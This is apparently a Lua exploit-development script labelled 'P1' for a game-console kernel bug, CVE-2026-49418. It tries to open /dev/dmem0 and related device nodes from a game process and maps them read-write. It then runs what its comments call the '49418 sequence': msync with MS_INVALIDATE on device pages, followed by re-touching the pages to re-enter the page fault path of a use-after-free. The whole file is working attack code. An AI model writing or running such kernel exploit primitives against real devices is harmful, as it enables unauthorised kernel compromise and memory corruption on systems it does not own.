-- P1: dmem0 device-pager reachability (CVE-2026-49418 prereq)
-- Question: can a game process open /dev/dmem0 and mmap it? That's the
-- device-backed mapping the 49418 UAF needs.
print("=== P1: dmem0 reachability ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
syscall.resolve({
    open = 5, close = 6, mmap = 477, munmap = 73,
    ioctl = 54, msync = 65
})
local function try_open(path, flags)
    local ok, fd = pcall(function() return syscall.open(path, flags or 0) end)
    if not ok then return -1 end
    return to_num(fd)
end
local paths = {"/dev/dmem0", "/dev/dmem1", "/dev/dmem", "/dev/dce", "/dev/gc", "/dev/ajm"}
for _, p in ipairs(paths) do
    local fd = try_open(p, 2)  -- O_RDWR
    print(p .. " -> fd=" .. tostring(fd))
    if fd >= 0 then
        -- try mmap 4 pages
        local ok, addr = pcall(function()
            return to_num(syscall.mmap(0, 65536, 3, 1, fd, 0))  -- RW, MAP_SHARED
        end)
        print("  mmap65536 rv=0x" .. string.format("%x", addr))
        if addr > 0 and addr < 0x800000000000 then
            -- touch it
            memory.write_dword(addr, 0x41414141)
            local rd = to_num(memory.read_dword(addr))
            print("  write/read: 0x" .. string.format("%x", rd))
            -- THE 49418 SEQUENCE: msync(MS_INVALIDATE) on device pages
            local ok2, ms = pcall(function()
                return to_num(syscall.msync(addr, 65536, 2))
            end)
            print("  msync(MS_INVALIDATE) rv=" .. tostring(ms))
            -- re-touch after invalidate (page fault re-entry)
            memory.write_dword(addr, 0x42424242)
            print("  post-invalidate read: 0x" .. string.format("%x", to_num(memory.read_dword(addr))))
            pcall(function() syscall.munmap(addr, 65536) end)
        end
        pcall(function() syscall.close(fd) end)
    end
end
print("P1_DONE")
